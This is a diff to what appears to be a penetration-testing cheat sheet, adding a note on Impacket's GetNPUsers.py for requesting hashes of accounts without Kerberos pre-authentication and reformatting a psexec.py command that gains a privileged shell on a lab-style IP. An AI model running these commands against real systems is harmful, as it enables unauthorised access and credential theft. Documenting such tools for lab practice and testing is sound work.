@@ -59,6 +59,12 @@
 
 ## psexec.py
 
-* Use Impacket's `psexec.py` to gain a **privileged shell**
+Use Impacket's `psexec.py` to gain a **privileged shell**
 
-        ./psexec.py administrator@10.10.10.4
+    ./psexec.py administrator@10.10.10.4
+
+## GetNPUsers.py
+
+Check if **Kerberos pre-authentication** has been *disabled* for an account
+
+    GetNPUsers.py domain.local/username -request -no-pass -dc-ip 10.10.10.4
